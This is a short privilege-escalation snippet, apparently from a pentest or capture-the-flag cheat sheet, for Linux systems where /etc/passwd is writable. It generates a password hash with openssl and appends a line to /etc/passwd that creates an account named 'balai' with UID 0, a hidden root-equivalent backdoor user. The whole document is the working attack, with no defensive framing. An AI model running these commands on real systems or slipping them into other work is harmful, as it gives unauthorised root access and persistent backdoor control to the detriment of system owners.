**Write Permission on /etc/passwd**
```bash
# generate passwd
openssl passwd balai
# Craete a new account name balai with passwd balai
echo 'balai:$1$MitD/YG8$XwmEazlonmgCt5riXXoCh0:0:0:root:/root:/bin/bash' >> /etc/passwd

```